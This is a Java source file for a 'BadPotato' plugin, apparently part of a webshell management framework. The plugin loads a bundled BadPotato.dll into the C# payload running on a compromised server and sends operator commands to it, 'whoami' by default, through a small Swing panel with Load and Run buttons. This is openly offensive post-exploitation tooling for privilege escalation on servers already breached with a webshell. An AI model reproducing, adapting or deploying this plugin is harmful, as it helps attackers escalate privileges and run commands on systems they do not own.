package shells.plugins.cshap;

import core.Encoding;
import core.annotation.PluginnAnnotation;
import core.imp.Payload;
import core.imp.Plugin;
import core.shell.ShellEntity;
import core.ui.component.RTextArea;
import util.Log;
import util.automaticBindClick;
import util.functions;
import util.http.ReqParameter;

import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ComponentAdapter;
import java.awt.event.ComponentEvent;
import java.io.InputStream;

@PluginnAnnotation(
        payloadName = "CShapDynamicPayload",
        Name = "BadPotato"
)
public class BadPotato implements Plugin {
    private static final String CLASS_NAME = "BadPotato.Run";
    private final JPanel panel = new JPanel(new BorderLayout());
    private final JButton loadButton = new JButton("Load");
    private final JButton runButton = new JButton("Run");
    private final JTextField commandTextField = new JTextField(35);
    private final JSplitPane splitPane = new JSplitPane();
    private final RTextArea resultTextArea = new RTextArea();
    private boolean loadState;
    private ShellEntity shellEntity;
    private Payload payload;
    private Encoding encoding;

    public BadPotato() {
        this.splitPane.setOrientation(JSplitPane.VERTICAL_SPLIT);
        this.splitPane.setDividerSize(0);
        JPanel topPanel = new JPanel();
        topPanel.add(this.loadButton);
        topPanel.add(this.commandTextField);
        topPanel.add(this.runButton);
        this.splitPane.setTopComponent(topPanel);
        this.splitPane.setBottomComponent(new JScrollPane(this.resultTextArea));
        this.splitPane.addComponentListener(new ComponentAdapter() {
            public void componentResized(ComponentEvent e) {
                BadPotato.this.splitPane.setDividerLocation(0.15D);
            }
        });
        this.panel.add(this.splitPane);
        this.commandTextField.setText("whoami");
    }

    private void loadButtonClick(ActionEvent actionEvent) {
        if (!this.loadState) {
            try {
                InputStream inputStream = this.getClass().getResourceAsStream("assets/BadPotato.dll");
                byte[] data = functions.readInputStream(inputStream);
                inputStream.close();
                if (this.payload.include("BadPotato.Run", data)) {
                    this.loadState = true;
                    JOptionPane.showMessageDialog(this.panel, "Load success", "??????", JOptionPane.INFORMATION_MESSAGE);
                } else {
                    JOptionPane.showMessageDialog(this.panel, "Load fail", "??????", JOptionPane.WARNING_MESSAGE);
                }
            } catch (Exception var4) {
                Log.error(var4);
                JOptionPane.showMessageDialog(this.panel, var4.getMessage(), "??????", JOptionPane.WARNING_MESSAGE);
            }
        } else {
            JOptionPane.showMessageDialog(this.panel, "Loaded", "??????", JOptionPane.INFORMATION_MESSAGE);
        }

    }

    private void runButtonClick(ActionEvent actionEvent) {
        ReqParameter parameter = new ReqParameter();
        parameter.add("cmd", this.commandTextField.getText());
        byte[] result = this.payload.evalFunc("BadPotato.Run", "run", parameter);
        this.resultTextArea.setText(this.encoding.Decoding(result));
    }

    public void init(ShellEntity shellEntity) {
        this.shellEntity = shellEntity;
        this.payload = this.shellEntity.getPayloadModel();
        this.encoding = Encoding.getEncoding(this.shellEntity);
        automaticBindClick.bindJButtonClick(this, this);
    }

    public JPanel getView() {
        return this.panel;
    }
}
